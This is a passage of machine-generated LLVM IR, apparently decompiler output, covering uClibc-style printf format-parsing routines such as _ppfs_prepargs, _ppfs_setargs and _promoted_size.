  %v4_140d022 = phi i32 [ %v4_140d021, %entry ], [ %v4_140d0, %dec_label_pc_140c8.dec_label_pc_140c8_crit_edge ]
  %v0_140cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_140cc = add i32 %v0_140cc.pre, -1
  store i32 %v1_140cc, i32* %r2.global-to-local, align 4
  %v7_140cc = icmp eq i32 %v0_140cc.pre, 1
  %v2_140d0 = inttoptr i32 %v4_140d022 to i32*
  store i32 8, i32* %v2_140d0, align 4
  %v3_140d0 = load i32, i32* %r1.global-to-local, align 4
  %v4_140d0 = add i32 %v3_140d0, 4
  store i32 %v4_140d0, i32* %r1.global-to-local, align 4
  br i1 %v7_140cc, label %dec_label_pc_140d8, label %dec_label_pc_140c8.dec_label_pc_140c8_crit_edge

dec_label_pc_140d8:                               ; preds = %dec_label_pc_140c8.dec_label_pc_140c8_crit_edge
  %v0_140d8 = load i32, i32* @r5, align 4
  store i32 %v0_140d8, i32* %r2.global-to-local, align 4
  %v1_1411c3 = inttoptr i32 %v0_140d8 to i8*
  %v2_1411c4 = load i8, i8* %v1_1411c3, align 1
  %v2_141206 = icmp eq i8 %v2_1411c4, 0
  br i1 %v2_141206, label %dec_label_pc_14128, label %dec_label_pc_140e8

dec_label_pc_140e0:                               ; preds = %dec_label_pc_14100
  %v2_140e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_140e4, i32* @r4, align 4
  store i32 %v6_14098, i32* @r5, align 4
  ret i32 -1

dec_label_pc_140e8:                               ; preds = %dec_label_pc_140d8, %dec_label_pc_1411c.backedge
  %v0_140f0 = phi i32 [ %storemerge, %dec_label_pc_1411c.backedge ], [ %v0_140d8, %dec_label_pc_140d8 ]
  %v2_1411c7 = phi i8 [ %v2_1411c, %dec_label_pc_1411c.backedge ], [ %v2_1411c4, %dec_label_pc_140d8 ]
  %v7_140e8 = icmp eq i8 %v2_1411c7, 37
  br i1 %v7_140e8, label %dec_label_pc_140f0, label %dec_label_pc_14118

dec_label_pc_140f0:                               ; preds = %dec_label_pc_140e8
  %v1_140f0 = add i32 %v0_140f0, 1
  %v2_140f0 = inttoptr i32 %v1_140f0 to i8*
  %v3_140f0 = load i8, i8* %v2_140f0, align 1
  store i32 %v1_140f0, i32* %r2.global-to-local, align 4
  %v7_140f4 = icmp eq i8 %v3_140f0, 37
  br i1 %v7_140f4, label %dec_label_pc_14118, label %dec_label_pc_14100

dec_label_pc_14100:                               ; preds = %dec_label_pc_140f0
  %v0_140f8 = load i32, i32* @r4, align 4
  %v2_14100 = inttoptr i32 %v0_140f8 to i32*
  store i32 %v1_140f0, i32* %v2_14100, align 4
  %v2_14104 = call i32 @_ppfs_parsespec(i32* %v2_14100)
  %v1_14108 = icmp slt i32 %v2_14104, 0
  br i1 %v1_14108, label %dec_label_pc_140e0, label %dec_label_pc_14110

dec_label_pc_14110:                               ; preds = %dec_label_pc_14100
  %v0_14110 = load i32, i32* @r4, align 4
  %v1_14110 = inttoptr i32 %v0_14110 to i32*
  %v2_14110 = load i32, i32* %v1_14110, align 4
  br label %dec_label_pc_1411c.backedge

dec_label_pc_14118:                               ; preds = %dec_label_pc_140e8, %dec_label_pc_140f0
  %v0_14118 = phi i32 [ %v0_140f0, %dec_label_pc_140e8 ], [ %v1_140f0, %dec_label_pc_140f0 ]
  %v1_14118 = add i32 %v0_14118, 1
  br label %dec_label_pc_1411c.backedge

dec_label_pc_1411c.backedge:                      ; preds = %dec_label_pc_14118, %dec_label_pc_14110
  %storemerge = phi i32 [ %v1_14118, %dec_label_pc_14118 ], [ %v2_14110, %dec_label_pc_14110 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1411c = inttoptr i32 %storemerge to i8*
  %v2_1411c = load i8, i8* %v1_1411c, align 1
  %v2_14120 = icmp eq i8 %v2_1411c, 0
  br i1 %v2_14120, label %dec_label_pc_1411c.dec_label_pc_14128_crit_edge, label %dec_label_pc_140e8

dec_label_pc_1411c.dec_label_pc_14128_crit_edge:  ; preds = %dec_label_pc_1411c.backedge
  %v0_14128.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14128

dec_label_pc_14128:                               ; preds = %dec_label_pc_1411c.dec_label_pc_14128_crit_edge, %dec_label_pc_140d8
  %v0_14128 = phi i32 [ %v0_14128.pre, %dec_label_pc_1411c.dec_label_pc_14128_crit_edge ], [ %v0_140d8, %dec_label_pc_140d8 ]
  %v3_1411c.lcssa.in = phi i8 [ %v2_1411c, %dec_label_pc_1411c.dec_label_pc_14128_crit_edge ], [ %v2_1411c4, %dec_label_pc_140d8 ]
  %v3_1411c.lcssa = zext i8 %v3_1411c.lcssa.in to i32
  %v1_14128 = load i32, i32* @r4, align 4
  %v2_14128 = inttoptr i32 %v1_14128 to i32*
  store i32 %v0_14128, i32* %v2_14128, align 4
  %v2_1412c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1412c, i32* @r4, align 4
  store i32 %v6_14098, i32* @r5, align 4
  ret i32 %v3_1411c.lcssa

; uselistorder directives
  uselistorder i8 %v2_1411c, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_140d8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_140d0, { 1, 0 }
  uselistorder i32 %v0_140cc.pre, { 1, 0 }
  uselistorder i32 %v6_14098, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_14118, { 1, 0 }
  uselistorder label %dec_label_pc_140e8, { 1, 0 }
  uselistorder label %dec_label_pc_140c8.dec_label_pc_140c8_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14130 = load i32, i32* @r4, align 4
  store i32 %v3_14130, i32* %stack_var_-12, align 4
  %v1_14134 = add i32 %arg1, 24
  %v2_14134 = inttoptr i32 %v1_14134 to i32*
  %v3_14134 = load i32, i32* %v2_14134, align 4
  store i32 %v3_14134, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_14144 = add i32 %arg1, 76
  %v3_14144 = inttoptr i32 %v2_14144 to i32*
  store i32 %arg2, i32* %v3_14144, align 4
  %v7_14148 = icmp sgt i32 %v3_14134, 0
  br i1 %v7_14148, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_14148 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_14148, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_1414c = load i32, i32* %r3.global-to-local, align 4
  %v2_1414c = add i32 %arg1, 8
  %v3_1414c = inttoptr i32 %v2_1414c to i32*
  store i32 %v0_1414c, i32* %v3_1414c, align 4
  %v0_14150 = load i32, i32* %r5.global-to-local, align 4
  %v2_14150 = add i32 %arg1, 28
  %v3_14150 = inttoptr i32 %v2_14150 to i32*
  store i32 %v0_14150, i32* %v3_14150, align 4
  %v0_14154 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14154, i32* %v2_14134, align 4
  %v0_14158 = load i32, i32* %r3.global-to-local, align 4
  %v2_14158 = add i32 %arg1, 4
  %v3_14158 = inttoptr i32 %v2_14158 to i32*
  store i32 %v0_14158, i32* %v3_14158, align 4
  %v0_1415c = call i32 @_ppfs_setargs()
  %v0_14160 = load i32, i32* %r5.global-to-local, align 4
  %v1_14160 = load i32, i32* @r4, align 4
  %v2_14160 = add i32 %v1_14160, 24
  %v3_14160 = inttoptr i32 %v2_14160 to i32*
  store i32 %v0_14160, i32* %v3_14160, align 4
  %v2_14164 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14164, i32* @r4, align 4
  ret i32 %v0_1415c

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 6, 5, 2, 1, 4, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_14168 = load i32, i32* @r0, align 4
  %v1_14168 = add i32 %v0_14168, 24
  %v2_14168 = inttoptr i32 %v1_14168 to i32*
  %v3_14168 = load i32, i32* %v2_14168, align 4
  store i32 %v3_14168, i32* %r1.global-to-local, align 4
  %v2_1416c = icmp eq i32 %v3_14168, 0
  %v3_14170 = load i32, i32* @r4, align 4
  store i32 %v3_14170, i32* %stack_var_-8, align 4
  %v1_14174 = add i32 %v0_14168, 80
  store i32 %v1_14174, i32* %ip.global-to-local, align 4
  %v1_14178 = add i32 %v0_14168, 8
  %v2_14178 = inttoptr i32 %v1_14178 to i32*
  %v3_14178 = load i32, i32* %v2_14178, align 4
  store i32 %v3_14178, i32* %r3.global-to-local, align 4
  %v6_14180 = icmp eq i32 %v3_14178, -2147483648
  br i1 %v2_1416c, label %dec_label_pc_14180, label %dec_label_pc_142a4

dec_label_pc_14180:                               ; preds = %entry
  br i1 %v6_14180, label %dec_label_pc_14188, label %dec_label_pc_141a0

dec_label_pc_14188:                               ; preds = %dec_label_pc_14180
  %v1_14188 = add i32 %v0_14168, 76
  %v2_14188 = inttoptr i32 %v1_14188 to i32*
  %v3_14188 = load i32, i32* %v2_14188, align 4
  store i32 %v3_14188, i32* %r3.global-to-local, align 4
  %v1_1418c = inttoptr i32 %v3_14188 to i32*
  %v2_1418c = load i32, i32* %v1_1418c, align 4
  store i32 %v2_1418c, i32* %r2.global-to-local, align 4
  %v1_14190 = add i32 %v3_14188, 4
  store i32 %v1_14190, i32* %r3.global-to-local, align 4
  store i32 %v1_14190, i32* %v2_14188, align 4
  %v0_14198 = load i32, i32* %r2.global-to-local, align 4
  %v1_14198 = load i32, i32* @r0, align 4
  %v2_14198 = add i32 %v1_14198, 8
  %v3_14198 = inttoptr i32 %v2_14198 to i32*
  store i32 %v0_14198, i32* %v3_14198, align 4
  %v0_1419c = load i32, i32* %r2.global-to-local, align 4
  %v1_1419c = load i32, i32* @r0, align 4
  %v2_1419c = add i32 %v1_1419c, 80
  %v3_1419c = inttoptr i32 %v2_1419c to i32*
  store i32 %v0_1419c, i32* %v3_1419c, align 4
  %v0_141a0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_141a0

dec_label_pc_141a0:                               ; preds = %dec_label_pc_14180, %dec_label_pc_14188
  %v1_141b8 = phi i32 [ %v0_14168, %dec_label_pc_14180 ], [ %v0_141a0.pre, %dec_label_pc_14188 ]
  %v1_141a0 = add i32 %v1_141b8, 4
  %v2_141a0 = inttoptr i32 %v1_141a0 to i32*
  %v3_141a0 = load i32, i32* %v2_141a0, align 4
  store i32 %v3_141a0, i32* %r3.global-to-local, align 4
  %v6_141a4 = icmp eq i32 %v3_141a0, -2147483648
  br i1 %v6_141a4, label %dec_label_pc_141ac, label %dec_label_pc_141c4

dec_label_pc_141ac:                               ; preds = %dec_label_pc_141a0
  %v1_141ac = add i32 %v1_141b8, 76
  %v2_141ac = inttoptr i32 %v1_141ac to i32*
  %v3_141ac = load i32, i32* %v2_141ac, align 4
  store i32 %v3_141ac, i32* %r3.global-to-local, align 4
  %v1_141b0 = inttoptr i32 %v3_141ac to i32*
  %v2_141b0 = load i32, i32* %v1_141b0, align 4
  store i32 %v2_141b0, i32* %r2.global-to-local, align 4
  %v1_141b4 = add i32 %v3_141ac, 4
  store i32 %v1_141b4, i32* %r3.global-to-local, align 4
  store i32 %v1_141b4, i32* %v2_141ac, align 4
  %v0_141bc = load i32, i32* %r2.global-to-local, align 4
  %v1_141bc = load i32, i32* @r0, align 4
  %v2_141bc = add i32 %v1_141bc, 4
  %v3_141bc = inttoptr i32 %v2_141bc to i32*
  store i32 %v0_141bc, i32* %v3_141bc, align 4
  %v0_141c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_141c0 = load i32, i32* @r0, align 4
  %v2_141c0 = add i32 %v1_141c0, 80
  %v3_141c0 = inttoptr i32 %v2_141c0 to i32*
  store i32 %v0_141c0, i32* %v3_141c0, align 4
  %v0_1429418.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_141c4

dec_label_pc_141c4:                               ; preds = %dec_label_pc_141a0, %dec_label_pc_141ac
  %v0_1429418 = phi i32 [ %v1_141b8, %dec_label_pc_141a0 ], [ %v0_1429418.pre, %dec_label_pc_141ac ]
  %v0_141c4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_141c4, i32* %lr.global-to-local, align 4
  %v1_1429419 = add i32 %v0_1429418, 28
  %v2_1429420 = inttoptr i32 %v1_1429419 to i32*
  %v3_1429421 = load i32, i32* %v2_1429420, align 4
  store i32 %v3_1429421, i32* %r3.global-to-local, align 4
  %v5_1429c23 = icmp slt i32 %v0_141c4, %v3_1429421
  br i1 %v5_1429c23, label %dec_label_pc_141cc, label %dec_label_pc_142a0.loopexit

dec_label_pc_141cc:                               ; preds = %dec_label_pc_141c4, %dec_label_pc_14290
  %v0_1429425 = phi i32 [ %v0_14294, %dec_label_pc_14290 ], [ %v0_1429418, %dec_label_pc_141c4 ]
  %v1_141cc24 = phi i32 [ %v1_14290, %dec_label_pc_14290 ], [ %v0_141c4, %dec_label_pc_141c4 ]
  %v4_141cc = mul i32 %v1_141cc24, 4
  %v5_141cc = add i32 %v0_1429425, %v4_141cc
  store i32 %v5_141cc, i32* %r3.global-to-local, align 4
  %v1_141d0 = add i32 %v5_141cc, 40
  %v2_141d0 = inttoptr i32 %v1_141d0 to i32*
  %v3_141d0 = load i32, i32* %v2_141d0, align 4
  store i32 %v3_141d0, i32* %r2.global-to-local, align 4
  %v7_141d4 = icmp eq i32 %v3_141d0, 8
  br i1 %v7_141d4, label %dec_label_pc_14290, label %dec_label_pc_141dc

dec_label_pc_141dc:                               ; preds = %dec_label_pc_141cc
  %v1_141dc = add i32 %v0_1429425, 76
  %v2_141dc = inttoptr i32 %v1_141dc to i32*
  %v3_141dc = load i32, i32* %v2_141dc, align 4
  store i32 %v3_141dc, i32* %r1.global-to-local, align 4
  %v8_141e0 = icmp sgt i32 %v3_141d0, 8
  br i1 %v8_141e0, label %dec_label_pc_14204, label %dec_label_pc_141e4

dec_label_pc_141e4:                               ; preds = %dec_label_pc_141dc
  %v7_141e4 = icmp eq i32 %v3_141d0, 2
  br i1 %v7_141e4, label %dec_label_pc_14250, label %dec_label_pc_141ec

dec_label_pc_141ec:                               ; preds = %dec_label_pc_141e4
  %v8_141ec = icmp sgt i32 %v3_141d0, 2
  br i1 %v8_141ec, label %dec_label_pc_141fc, label %dec_label_pc_141f0

dec_label_pc_141f0:                               ; preds = %dec_label_pc_141ec
  %v1_141f0 = icmp slt i32 %v3_141d0, 0
  br i1 %v1_141f0, label %dec_label_pc_1427c, label %dec_label_pc_14250

dec_label_pc_141fc:                               ; preds = %dec_label_pc_141ec
  %v7_141fc = icmp eq i32 %v3_141d0, 7
  br i1 %v7_141fc, label %dec_label_pc_14264, label %dec_label_pc_1427c

dec_label_pc_14204:                               ; preds = %dec_label_pc_141dc
  %v7_14204 = icmp eq i32 %v3_141d0, 1024
  br i1 %v7_14204, label %dec_label_pc_14250, label %dec_label_pc_1420c

dec_label_pc_1420c:                               ; preds = %dec_label_pc_14204
  %v8_1420c = icmp sgt i32 %v3_141d0, 1024
  br i1 %v8_1420c, label %dec_label_pc_14224, label %dec_label_pc_14210

dec_label_pc_14210:                               ; preds = %dec_label_pc_1420c
  switch i32 %v3_141d0, label %dec_label_pc_1427c [
    i32 256, label %dec_label_pc_14250
    i32 512, label %dec_label_pc_14250
  ]

dec_label_pc_14224:                               ; preds = %dec_label_pc_1420c
  %v7_14224 = icmp eq i32 %v3_141d0, 2048
  br i1 %v7_14224, label %dec_label_pc_1423c, label %dec_label_pc_14234

dec_label_pc_14234:                               ; preds = %dec_label_pc_14224
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_14230 = icmp eq i32 %v3_141d0, 2055
  br i1 %v9_14230, label %dec_label_pc_14264, label %dec_label_pc_1427c

dec_label_pc_1423c:                               ; preds = %dec_label_pc_14224
  %v1_1423c = add i32 %v3_141dc, 8
  store i32 %v1_1423c, i32* %r3.global-to-local, align 4
  store i32 %v1_1423c, i32* %v2_141dc, align 4
  %v0_14244 = load i32, i32* %r1.global-to-local, align 4
  %v1_14244 = inttoptr i32 %v0_14244 to i32*
  %v2_14244 = load i32, i32* %v1_14244, align 4
  store i32 %v2_14244, i32* %r3.global-to-local, align 4
  %v3_14244 = add i32 %v0_14244, 4
  %v4_14244 = inttoptr i32 %v3_14244 to i32*
  %v5_14244 = load i32, i32* %v4_14244, align 4
  store i32 %v5_14244, i32* %r4.global-to-local, align 4
  %v0_14248 = load i32, i32* %ip.global-to-local, align 4
  %v1_14248 = inttoptr i32 %v0_14248 to i32*
  store i32 %v2_14244, i32* %v1_14248, align 4
  %v3_14248 = add i32 %v0_14248, 4
  %v4_14248 = inttoptr i32 %v3_14248 to i32*
  %v5_14248 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14248, i32* %v4_14248, align 4
  br label %dec_label_pc_1428c

dec_label_pc_14250:                               ; preds = %dec_label_pc_14210, %dec_label_pc_14210, %dec_label_pc_141f0, %dec_label_pc_14204, %dec_label_pc_141e4
  %v1_14250 = inttoptr i32 %v3_141dc to i32*
  %v2_14250 = load i32, i32* %v1_14250, align 4
  store i32 %v2_14250, i32* %r2.global-to-local, align 4
  %v1_14254 = add i32 %v3_141dc, 4
  store i32 %v1_14254, i32* %r3.global-to-local, align 4
  store i32 %v1_14254, i32* %v2_141dc, align 4
  %v0_1425c = load i32, i32* %r2.global-to-local, align 4
  %v1_1425c = load i32, i32* %ip.global-to-local, align 4
  %v2_1425c = inttoptr i32 %v1_1425c to i32*
  store i32 %v0_1425c, i32* %v2_1425c, align 4
  br label %dec_label_pc_1428c

dec_label_pc_14264:                               ; preds = %dec_label_pc_141fc, %dec_label_pc_14234
  %v3_14264 = load i32, i32* %v2_141dc, align 4
  store i32 %v3_14264, i32* %r3.global-to-local, align 4
  %v1_14268 = inttoptr i32 %v3_14264 to i32*
  %v2_14268 = load i32, i32* %v1_14268, align 4
  store i32 %v2_14268, i32* %r1.global-to-local, align 4
  %v3_14268 = add i32 %v3_14264, 4
  %v4_14268 = inttoptr i32 %v3_14268 to i32*
  %v5_14268 = load i32, i32* %v4_14268, align 4
  store i32 %v5_14268, i32* %r2.global-to-local, align 4
  %v1_1426c = add i32 %v3_14264, 8
  store i32 %v1_1426c, i32* %r3.global-to-local, align 4
  store i32 %v1_1426c, i32* %v2_141dc, align 4
  %v0_14274 = load i32, i32* %ip.global-to-local, align 4
  %v1_14274 = inttoptr i32 %v0_14274 to i32*
  %v2_14274 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_14274, i32* %v1_14274, align 4
  %v3_14274 = add i32 %v0_14274, 4
  %v4_14274 = inttoptr i32 %v3_14274 to i32*
  %v5_14274 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_14274, i32* %v4_14274, align 4
  br label %dec_label_pc_1428c

dec_label_pc_1427c:                               ; preds = %dec_label_pc_14210, %dec_label_pc_141fc, %dec_label_pc_141f0, %dec_label_pc_14234
  %v1_1427c = add i32 %v3_141dc, 4
  store i32 %v1_1427c, i32* %r3.global-to-local, align 4
  store i32 %v1_1427c, i32* %v2_141dc, align 4
  %v0_14284 = load i32, i32* %r1.global-to-local, align 4
  %v1_14284 = inttoptr i32 %v0_14284 to i32*
  %v2_14284 = load i32, i32* %v1_14284, align 4
  store i32 %v2_14284, i32* %r3.global-to-local, align 4
  %v1_14288 = load i32, i32* %ip.global-to-local, align 4
  %v2_14288 = inttoptr i32 %v1_14288 to i32*
  store i32 %v2_14284, i32* %v2_14288, align 4
  br label %dec_label_pc_1428c

dec_label_pc_1428c:                               ; preds = %dec_label_pc_14264, %dec_label_pc_14250, %dec_label_pc_1423c, %dec_label_pc_1427c
  %v0_1428c = load i32, i32* %ip.global-to-local, align 4
  %v1_1428c = add i32 %v0_1428c, 8
  store i32 %v1_1428c, i32* %ip.global-to-local, align 4
  %v0_14290.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_14294.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14290

dec_label_pc_14290:                               ; preds = %dec_label_pc_141cc, %dec_label_pc_1428c
  %v0_14294 = phi i32 [ %v0_1429425, %dec_label_pc_141cc ], [ %v0_14294.pre, %dec_label_pc_1428c ]
  %v0_14290 = phi i32 [ %v1_141cc24, %dec_label_pc_141cc ], [ %v0_14290.pre, %dec_label_pc_1428c ]
  %v1_14290 = add i32 %v0_14290, 1
  store i32 %v1_14290, i32* %lr.global-to-local, align 4
  %v1_14294 = add i32 %v0_14294, 28
  %v2_14294 = inttoptr i32 %v1_14294 to i32*
  %v3_14294 = load i32, i32* %v2_14294, align 4
  store i32 %v3_14294, i32* %r3.global-to-local, align 4
  %v5_1429c = icmp slt i32 %v1_14290, %v3_14294
  br i1 %v5_1429c, label %dec_label_pc_141cc, label %dec_label_pc_14294.dec_label_pc_142a0.loopexit_crit_edge

dec_label_pc_142a4:                               ; preds = %entry
  br i1 %v6_14180, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_142a4
  %v2_142a8 = add i32 %v0_14168, 36
  %v3_142a8 = inttoptr i32 %v2_142a8 to i8*
  %v4_142a8 = load i8, i8* %v3_142a8, align 1
  %v5_142a8 = zext i8 %v4_142a8 to i32
  %v5_142ac = mul nuw nsw i32 %v5_142a8, 8
  %v6_142ac = add i32 %v5_142ac, %v1_14174
  store i32 %v6_142ac, i32* %r3.global-to-local, align 4
  %v2_142b0 = add i32 %v6_142ac, -8
  %v3_142b0 = inttoptr i32 %v2_142b0 to i32*
  %v4_142b0 = load i32, i32* %v3_142b0, align 4
  store i32 %v4_142b0, i32* %r3.global-to-local, align 4
  store i32 %v4_142b0, i32* %v2_14178, align 4
  %v0_142b8.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_142a4, %bb
  %v2_142cc = phi i32 [ %v0_142b8.pre, %bb ], [ %v0_14168, %dec_label_pc_142a4 ]
  %v1_142b8 = add i32 %v2_142cc, 4
  %v2_142b8 = inttoptr i32 %v1_142b8 to i32*
  %v3_142b8 = load i32, i32* %v2_142b8, align 4
  store i32 %v3_142b8, i32* %r3.global-to-local, align 4
  %v6_142bc = icmp eq i32 %v3_142b8, -2147483648
  br i1 %v6_142bc, label %bb15, label %dec_label_pc_142a0

bb15:                                             ; preds = %.thread2
  %v2_142c0 = add i32 %v2_142cc, 37
  %v3_142c0 = inttoptr i32 %v2_142c0 to i8*
  %v4_142c0 = load i8, i8* %v3_142c0, align 1
  %v5_142c0 = zext i8 %v4_142c0 to i32
  %v1_142c4 = load i32, i32* %ip.global-to-local, align 4
  %v5_142c4 = mul nuw nsw i32 %v5_142c0, 8
  %v6_142c4 = add i32 %v5_142c4, %v1_142c4
  store i32 %v6_142c4, i32* %r3.global-to-local, align 4
  %v2_142c8 = add i32 %v6_142c4, -8
  %v3_142c8 = inttoptr i32 %v2_142c8 to i32*
  %v4_142c8 = load i32, i32* %v3_142c8, align 4
  store i32 %v4_142c8, i32* %r3.global-to-local, align 4
  store i32 %v4_142c8, i32* %v2_142b8, align 4
  %v0_142d0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_142a0

dec_label_pc_14294.dec_label_pc_142a0.loopexit_crit_edge: ; preds = %dec_label_pc_14290
  br label %dec_label_pc_142a0.loopexit

dec_label_pc_142a0.loopexit:                      ; preds = %dec_label_pc_14294.dec_label_pc_142a0.loopexit_crit_edge, %dec_label_pc_141c4
  %v0_14294.lcssa = phi i32 [ %v0_14294, %dec_label_pc_14294.dec_label_pc_142a0.loopexit_crit_edge ], [ %v0_1429418, %dec_label_pc_141c4 ]
  br label %dec_label_pc_142a0

dec_label_pc_142a0:                               ; preds = %dec_label_pc_142a0.loopexit, %.thread2, %bb15
  %v1_142f0 = phi i32 [ %v0_14294.lcssa, %dec_label_pc_142a0.loopexit ], [ %v2_142cc, %.thread2 ], [ %v0_142d0.pre, %bb15 ]
  %v1_142d0 = add i32 %v1_142f0, 8
  %v2_142d0 = inttoptr i32 %v1_142d0 to i32*
  %v3_142d0 = load i32, i32* %v2_142d0, align 4
  store i32 %v3_142d0, i32* %r1.global-to-local, align 4
  %v1_142d4 = icmp slt i32 %v3_142d0, 0
  br i1 %v1_142d4, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_142a0
  %v5_142d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_142d8, i32* @r4, align 4
  ret i32 %v1_142f0

bb17:                                             ; preds = %dec_label_pc_142a0
  %v1_142dc = add i32 %v1_142f0, 16
  %v2_142dc = inttoptr i32 %v1_142dc to i32*
  %v3_142dc = load i32, i32* %v2_142dc, align 4
  %v1_142e4 = sub i32 0, %v3_142d0
  store i32 %v1_142e4, i32* %r1.global-to-local, align 4
  %v1_142e0 = and i32 %v3_142dc, -10
  %v1_142e8 = or i32 %v1_142e0, 8
  store i32 %v1_142e8, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_142f0 = add i32 %v1_142f0, 20
  %v3_142f0 = inttoptr i32 %v2_142f0 to i32*
  store i32 32, i32* %v3_142f0, align 4
  %v0_142f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_142f4 = load i32, i32* @r0, align 4
  %v2_142f4 = add i32 %v1_142f4, 8
  %v3_142f4 = inttoptr i32 %v2_142f4 to i32*
  store i32 %v0_142f4, i32* %v3_142f4, align 4
  %v0_142f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_142f8 = load i32, i32* @r0, align 4
  %v2_142f8 = add i32 %v1_142f8, 16
  %v3_142f8 = inttoptr i32 %v2_142f8 to i32*
  store i32 %v0_142f8, i32* %v3_142f8, align 4
  %v2_142fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_142fc, i32* @r4, align 4
  %v8_142fc = load i32, i32* @r0, align 4
  ret i32 %v8_142fc

; uselistorder directives
  uselistorder i32 %v1_14290, { 2, 1, 0 }
  uselistorder i32 %v0_14294, { 1, 2, 0 }
  uselistorder i32 %v3_14264, { 0, 2, 1, 3 }
  uselistorder i32 %v3_141dc, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_141dc, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_141d0, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_141cc24, { 1, 0 }
  uselistorder i32 %v0_1429418, { 2, 0, 1 }
  uselistorder i32 %v0_14168, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_142a0, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_14290, { 1, 0 }
  uselistorder label %dec_label_pc_1428c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1427c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14264, { 1, 0 }
  uselistorder label %dec_label_pc_14250, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_141cc, { 1, 0 }
  uselistorder label %dec_label_pc_141c4, { 1, 0 }
  uselistorder label %dec_label_pc_141a0, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_1431c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14308

dec_label_pc_14308:                               ; preds = %dec_label_pc_14324, %entry
  %v0_14308 = phi i32 [ %v1_14308, %dec_label_pc_14324 ], [ ptrtoint (i32* @global_var_1d2e8.898 to i32), %entry ]
  %v1_14308 = add i32 %v0_14308, -2
  %v1_1430c = add i32 %v0_14308, -1
  %v2_1430c = inttoptr i32 %v1_1430c to i8*
  %v3_1430c = load i8, i8* %v2_1430c, align 1
  %v4_1430c = zext i8 %v3_1430c to i32
  %v1_14310 = inttoptr i32 %v1_14308 to i8*
  %v2_14310 = load i8, i8* %v1_14310, align 2
  %v3_14310 = zext i8 %v2_14310 to i32
  %v3_14314 = mul nuw i32 %v4_1430c, 16777216
  %v4_14318 = sdiv i32 %v3_14314, 65536
  %v5_14318 = or i32 %v4_14318, %v3_14310
  %v9_1431c = icmp eq i32 %v5_14318, %v1_1431c.pre
  br i1 %v9_1431c, label %dec_label_pc_14308.dec_label_pc_14330_crit_edge, label %dec_label_pc_14324

dec_label_pc_14308.dec_label_pc_14330_crit_edge:  ; preds = %dec_label_pc_14308
  br label %dec_label_pc_14330

dec_label_pc_14324:                               ; preds = %dec_label_pc_14308
  %tmp = icmp ugt i32 %v1_14308, ptrtoint (i32* @global_var_1d2d0.900 to i32)
  br i1 %tmp, label %dec_label_pc_14308, label %dec_label_pc_14330

dec_label_pc_14330:                               ; preds = %dec_label_pc_14324, %dec_label_pc_14308.dec_label_pc_14330_crit_edge
